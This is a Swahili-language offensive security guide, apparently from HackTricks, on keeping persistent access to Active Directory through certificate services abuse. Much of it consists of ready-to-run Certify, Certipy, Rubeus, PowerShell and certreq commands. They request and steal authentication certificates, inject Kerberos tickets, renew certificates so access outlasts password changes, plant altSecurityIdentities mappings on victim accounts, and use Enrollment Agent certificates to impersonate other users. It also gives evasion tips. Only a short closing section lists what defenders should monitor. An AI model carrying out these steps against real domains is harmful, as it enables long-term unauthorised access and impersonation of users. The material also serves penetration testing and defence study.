# AD CS Uendelevu wa Akaunti

{{#include ../../../banners/hacktricks-training.md}}

**Huu ni muhtasari mdogo wa sura za uendelevu wa akaunti za utafiti bora kutoka [https://specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://specterops.io/assets/resources/Certified_Pre-Owned.pdf)**

## Kuelewa Uiba wa Vidhibitisho vya Mtumiaji Hai kwa Vyeti – PERSIST1

Katika tukio ambapo mtumiaji anaweza kuomba cheti kinachoruhusu uthibitishaji wa domain, mshambuliaji ana nafasi ya kuomba na kuiba cheti hicho ili kudumisha uendelevu kwenye mtandao. Kwa chaguo-msingi, kiolezo la `User` katika Active Directory huruhusu maombi kama hayo, ingawa wakati mwingine linaweza kuzimwa.

Kwa kutumia [Certify](https://github.com/GhostPack/Certify) au [Certipy](https://github.com/ly4k/Certipy), unaweza kutafuta vielezo vilivyowezeshwa vinavyoruhusu uthibitishaji wa mteja kisha kuomba kimoja:
```bash
# Enumerate client-auth capable templates
Certify.exe find /clientauth

# Request a user cert from an Enterprise CA (current user context)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User

# Using Certipy (RPC/DCOM/WebEnrollment supported). Saves a PFX by default
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' -template 'User' -out user.pfx
```
Nguvu ya cheti iko katika uwezo wake wa kuthibitisha kuwa mtumiaji anayemiliki; bila kujali mabadiliko ya nywila, mradi cheti kipo halali.

Unaweza kubadilisha PEM kuwa PFX na kuitumia kupata TGT:
```bash
# Convert PEM returned by Certify to PFX
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

# Use certificate for PKINIT and inject the TGT
Rubeus.exe asktgt /user:john /certificate:C:\Temp\cert.pfx /password:CertPass! /ptt

# Or with Certipy
certipy auth -pfx user.pfx -dc-ip 10.0.0.10
```
> Kumbuka: Imeunganishwa na mbinu nyingine (ona sehemu za THEFT), uthibitishaji unaotegemea vyeti unaruhusu upatikanaji wa kudumu bila kugusa LSASS na hata kutoka muktadha usio na ruhusa za juu.

## Kupata Uendelevu wa Mashine kwa Vyeti - PERSIST2

Ikiwa mshambuliaji ana ruhusa zilizoinuliwa kwenye host, wanaweza kusajili akaunti ya mashine ya mfumo uliodhibitiwa kwa cheti kwa kutumia template ya chaguo-msingi `Machine`. Kujihakikishia kama mashine kunawezesha S4U2Self kwa huduma za ndani na kunaweza kutoa uendelevu thabiti wa host:
```bash
# Request a machine certificate as SYSTEM
Certify.exe request /ca:dc.theshire.local/theshire-DC-CA /template:Machine /machine

# Authenticate as the machine using the issued PFX
Rubeus.exe asktgt /user:HOSTNAME$ /certificate:C:\Temp\host.pfx /password:Passw0rd! /ptt
```
## Kuongeza Uendelevu Kupitia Upya wa Vyeti - PERSIST3

Kutumia vibaya vipindi vya uhalali na upya vya template za vyeti kunaweza kumruhusu mshambuliaji kudumisha upatikanaji wa muda mrefu. Ikiwa unamiliki cheti kilichotolewa hapo awali pamoja na private key yake, unaweza kuki-upya kabla ya kumalizika ili kupata cheti kipya chenye uhalali wa muda mrefu bila kuacha alama za maombi zinazounganishwa na mhusika wa awali.
```bash
# Renewal with Certipy (works with RPC/DCOM/WebEnrollment)
# Provide the existing PFX and target the same CA/template when possible
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -pfx user_old.pfx -renew -out user_renewed.pfx

# Native Windows renewal with certreq
# (use the serial/thumbprint of the cert to renew; reusekeys preserves the keypair)
certreq -enroll -user -cert <SerialOrID> renew [reusekeys]
```
> Ushauri wa kiutendaji: Fuatilia muda wa uhalali wa faili za PFX zinazoshikiliwa na mshambuliaji na ziresheni mapema. Ureishe pia unaweza kusababisha vyeti vilivyosasishwa kujumuisha modern SID mapping extension, vikiendelea kutumika chini ya stricter DC mapping rules (ona sehemu inayofuata).

## Kuanzisha ramani wazi za vyeti (altSecurityIdentities) – PERSIST4

Ikiwa unaweza kuandika kwenye sifa ya akaunti ya lengo `altSecurityIdentities`, unaweza kufafanua wazi ramani ya cheti kinachodhibitiwa na mshambuliaji kwa akaunti hiyo. Hii inadumu hata baada ya mabadiliko ya nywila na, unapoitumia formati thabiti za ramani, inabaki kufanya kazi chini ya modern DC enforcement.

Mtiririko wa juu:

1. Pata au toa cheti cha client-auth unachodhibiti (kwa mfano, enroll `User` template kama wewe mwenyewe).
2. Chukua kitambulisho thabiti kutoka kwa cheti (Issuer+Serial, SKI, or SHA1-PublicKey).
3. Ongeza ramani wazi kwenye `altSecurityIdentities` ya principal wa mwathirika kwa kutumia kitambulisho hicho.
4. Jithibitisha kwa cheti chako; DC itaifananisha na akaunti ya mwathirika kupitia ramani hiyo wazi.

Mfano (PowerShell) ukitumia ramani thabiti ya Issuer+Serial:
```powershell
# Example values - reverse the issuer DN and serial as required by AD mapping format
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'
$SerialR = '1200000000AC11000000002B' # reversed byte order of the serial
$Map     = "X509:<I>$Issuer<SR>$SerialR"

# Add mapping to victim. Requires rights to write altSecurityIdentities on the object
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
Kisha thibitisha kwa PFX yako. Certipy itapata TGT moja kwa moja:
```bash
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10

# If PKINIT is unavailable on the DC, reuse the same persisted cert via Schannel/LDAPS
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10 -ldap-shell
```
### Kujenga Ramani Imara za `altSecurityIdentities`

Kivitendo, **Issuer+Serial** na **SKI** mappings ndizo miundo imara rahisi zaidi kujenga kutoka kwa cheti kilichoshikiliwa na mshambuliaji. Hii ni muhimu baada ya **February 11, 2025**, wakati DCs zitakapoweka chaguo la msingi kuwa **Full Enforcement** na ramani dhaifu zitakapokwisha kuwa za kuaminika.
```bash
# Extract issuer, serial and SKI from a cert/PFX
openssl pkcs12 -in attacker_user.pfx -clcerts -nokeys -out attacker_user.crt
openssl x509 -in attacker_user.crt -noout -issuer -serial -ext subjectKeyIdentifier
```

```powershell
# Example strong SKI mapping for a user or computer object
$Map = 'X509:<SKI>9C4D7E8A1B2C3D4E5F60718293A4B5C6D7E8F901'
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
# Set-ADComputer -Identity 'WS01$' -Add @{altSecurityIdentities=$Map}
```
Vidokezo
- Tumia aina za ulinganifu zenye nguvu tu: `X509IssuerSerialNumber`, `X509SKI`, au `X509SHA1PublicKey`. Miundo dhaifu (Subject/Issuer, Subject-only, RFC822 email) imepitwa na wakati na inaweza kuzuiwa na sera ya DC.
- Ulinganifu hufanya kazi kwa vitu vya **mtumiaji** na **kompyuta**, hivyo upatikanaji wa kuandika kwenye `altSecurityIdentities` ya akaunti ya kompyuta unatosha kuendelea kuwepo kama mashine hiyo.
- Mnyororo wa vyeti lazima ujengwe hadi mzizi unaoaminiwa na DC. Enterprise CAs katika NTAuth kwa kawaida zinatambulika; mazingira mengine pia huamini public CAs.
- Schannel authentication unabaki kuwa muhimu kwa persistence hata wakati PKINIT inashindwa kwa sababu DC hauna Smart Card Logon EKU au inarejesha `KDC_ERR_PADATA_TYPE_NOSUPP`.

Kwa maelezo zaidi kuhusu ulinganifu dhaifu ulio wazi na njia za mashambulizi, ona:


{{#ref}}
domain-escalation.md
{{#endref}}

## Enrollment Agent as Persistence – PERSIST5

Ikiwa utapata cheti halali cha Certificate Request Agent/Enrollment Agent, unaweza kutengeneza vyeti vipya vinavyoweza kuruhusu kuingia kwa niaba ya watumiaji kama utakavyo na kuhifadhi agent PFX nje ya mtandao kama tokeni ya kudumu. Mtiririko wa utumiaji mbaya:
```bash
# Request an Enrollment Agent cert (requires template rights)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:"Certificate Request Agent"

# Mint a user cert on behalf of another principal using the agent PFX
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User \
/onbehalfof:CORP\\victim /enrollcert:C:\Temp\agent.pfx /enrollcertpw:AgentPfxPass

# Or with Certipy
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -on-behalf-of 'CORP/victim' -pfx agent.pfx -out victim_onbo.pfx
```
Kufutwa kwa cheti cha agent au ruhusa za template kunahitajika ili kuondoa udumu huu.

Vidokezo vya uendeshaji
- Matoleo ya kisasa ya `Certipy` yanaunga mkono `-on-behalf-of` na `-renew`, hivyo mshambuliaji anayemiliki Enrollment Agent PFX anaweza kutengeneza na baadaye ku-renew vyeti za leaf bila kugusa tena akaunti ya lengo asilia.
- Iwapo upokeaji wa TGT kwa msingi wa PKINIT hauwezekani, cheti kilichotolewa kwa njia ya on-behalf-of bado kinatumika kwa Schannel authentication kwa kutumia `certipy auth -pfx victim_onbo.pfx -dc-ip 10.0.0.10 -ldap-shell`.

## 2025 Utekelezaji Mkali wa Ramani za Vyeti (Strong Certificate Mapping Enforcement): Athari kwa Uendelevu

Microsoft KB5014754 ilianzisha Strong Certificate Mapping Enforcement kwenye domain controllers. Tangu 11 Februari 2025, DCs kwa chaguo-msingi ziko kwenye Utekelezaji Kamili (Full Enforcement), zikikataa ramani dhaifu/zisizoeleweka. Mambo ya kuzingatia kwa vitendo:

- Vyeti vya kabla ya 2022 visivyo na ugani wa ramani ya SID vinaweza kushindwa katika ramani ya implicit wakati DCs ziko kwenye Utekelezaji Kamili. Washambuliaji wanaweza kudumisha upatikanaji kwa ku-renew vyeti kupitia AD CS (ili kupata ugani wa SID) au kwa kupandisha ramani wazi yenye nguvu katika `altSecurityIdentities` (PERSIST4).
- Ramani wazi zinazotumia fomati za nguvu (Issuer+Serial, SKI, SHA1-PublicKey) zinaendelea kufanya kazi. Fomati dhaifu (Issuer/Subject, Subject-only, RFC822) zinaweza kuzuiwa na zinapaswa kuepukika kwa udumu.

Wasimamizi wanapaswa kufuatilia na kutoa tahadhari kuhusu:
- Mabadiliko ya `altSecurityIdentities` pamoja na utoaji/renewal za vyeti za Enrollment Agent na User.
- Rejista za utoaji za CA kwa ombi la on-behalf-of na mifumo isiyokuwa ya kawaida ya renewal.

## References

- Microsoft. KB5014754: Certificate-based authentication changes on Windows domain controllers (enforcement timeline and strong mappings).
https://support.microsoft.com/en-au/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16
- SpecterOps. ADCS ESC14 Abuse Technique (explicit `altSecurityIdentities` abuse on user/computer objects).
https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/
- Certipy Wiki – Command Reference (`req -renew`, `auth`, `shadow`).
https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference
- Almond Offensive Security. Authenticating with certificates when PKINIT is not supported.
https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html

{{#include ../../../banners/hacktricks-training.md}}
